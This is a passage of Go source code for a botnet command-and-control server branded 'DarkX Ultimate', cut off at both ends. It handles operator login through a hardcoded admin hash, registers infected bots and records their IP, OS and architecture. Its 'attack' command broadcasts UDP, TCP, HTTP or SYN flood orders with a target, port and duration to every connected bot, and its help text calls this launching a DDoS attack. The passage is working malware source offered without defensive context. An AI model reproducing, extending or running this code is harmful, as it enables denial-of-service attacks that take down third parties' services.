        }

        func authenticateUser(username, password string) bool {
            hasher := sha256.New()
            hasher.Write([]byte(password))
            hashedPass := hex.EncodeToString(hasher.Sum(nil))
            
            return username == "admin" && hashedPass == "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92"
        }

        func showDashboard(conn net.Conn, reader *bufio.Reader, writer *bufio.Writer) {
            for {
                conn.Write([]byte("\033[1;36mdarkx>\033[0m "))
                cmd, _ := reader.ReadString('\n')
                cmd = strings.TrimSpace(cmd)
                
                switch {
                case cmd == "help":
                    showHelp(conn)
                case cmd == "bots":
                    showBots(conn)
                case cmd == "stats":
                    showStats(conn)
                case strings.HasPrefix(cmd, "attack"):
                    handleAttackCommand(conn, cmd)
                case cmd == "clear":
                    conn.Write([]byte("\033[2J\033[H"))
                case cmd == "exit":
                    conn.Write([]byte("ğŸ‘‹ Goodbye!\n"))
                    return
                default:
                    conn.Write([]byte("âŒ Unknown command. Type 'help' for available commands.\n"))
                }
            }
        }

        func handleAttackCommand(conn net.Conn, cmd string) {
            parts := strings.Split(cmd, " ")
            if len(parts) < 4 {
                conn.Write([]byte("Usage: attack <type> <target> <port> <duration>\n"))
                conn.Write([]byte("Types: udp, tcp, http, syn\n"))
                return
            }
            
            attack := Attack{
                Type:     parts[1],
                Target:   parts[2],
                Port:     parts[3],
                Duration: parts[4],
                Power:    len(bots),
            }
            
            attacks = append(attacks, attack)
            conn.Write([]byte(fmt.Sprintf("âš¡ Attack launched with %d bots!\n", len(bots))))
            
            // Send attack command to all bots
            botMutex.Lock()
            for _, bot := range bots {
                bot.Conn.Write([]byte(fmt.Sprintf("ATTACK %s %s %s %s\n", attack.Type, attack.Target, attack.Port, attack.Duration)))
            }
            botMutex.Unlock()
        }

        func showBots(conn net.Conn) {
            botMutex.Lock()
            defer botMutex.Unlock()
            
            conn.Write([]byte(fmt.Sprintf("ğŸ¤– Connected Bots: %d\n", len(bots))))
            conn.Write([]byte("â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\n"))
            conn.Write([]byte("â”‚ IP Address   â”‚ OS         â”‚ Arch       â”‚ Version  â”‚\n"))
            conn.Write([]byte("â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\n"))
            
            for _, bot := range bots {
                conn.Write([]byte(fmt.Sprintf("â”‚ %-12s â”‚ %-10s â”‚ %-10s â”‚ %-8s â”‚\n", 
                    bot.IP, bot.OS, bot.Arch, bot.Version)))
            }
            conn.Write([]byte("â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n"))
        }

        func showStats(conn net.Conn) {
            conn.Write([]byte(fmt.Sprintf(`
ğŸ“Š DarkX Ultimate Statistics:
â”œâ”€â”€ Connected Bots: %d
â”œâ”€â”€ Active Attacks: %d  
â”œâ”€â”€ Uptime: 24h
â”œâ”€â”€ Total Power: %d Gbps
â””â”€â”€ Recruitment: Active
            `, len(bots), len(attacks), len(bots)*100)))
        }

        func showHelp(conn net.Conn) {
            conn.Write([]byte(`
ğŸ› ï¸ DarkX Ultimate Commands:
â”œâ”€â”€ bots          - Show connected bots
â”œâ”€â”€ stats         - Show system statistics  
â”œâ”€â”€ attack        - Launch DDoS attack
â”œâ”€â”€ clear         - Clear screen
â”œâ”€â”€ help          - Show this help
â””â”€â”€ exit          - Exit CNC
            `))
        }

        func handleBotConnection(conn net.Conn) {
            defer conn.Close()
            
            reader := bufio.NewReader(conn)
            
            // Bot authentication and info exchange
            conn.Write([]byte("AUTH\n"))
            info, _ := reader.ReadString('\n')
            info = strings.TrimSpace(info)
            
            parts := strings.Split(info, "|")
            if len(parts) < 4 {
                return
            }
            
            bot := Bot{
                Conn:    conn,
                IP:      strings.Split(conn.RemoteAddr().String(), ":")[0],
                OS:      parts[1],
                Arch:    parts[2],
                Version: parts[3],
            }
            
            botMutex.Lock()
            bots = append(bots, bot)
            botMutex.Unlock()
            
            log.Printf("ğŸ¤– New bot connected: %s (%s/%s)", bot.IP, bot.OS, bot.Arch)
            
            // Keep connection alive and handle commands
            for {
                cmd, err := reader.ReadString('\n')
                if err != nil {
                    break
                }
                
                cmd = strings.TrimSpace(cmd)
                if cmd == "PING" {
                    conn.Write([]byte("PONG\n"))
                }
            }
            
            // Remove bot when disconnected
            botMutex.Lock()
            for i, b := range bots {
                if b.Conn == conn {
                    bots = append(bots[:i], bots[i+1:]...)
                    break
                }
            }
            botMutex.Unlock()
            
            log.Printf("ğŸ¤– Bot disconnected: %s", bot.IP)
        }

        func handleAPIConnection(conn net.Conn) {
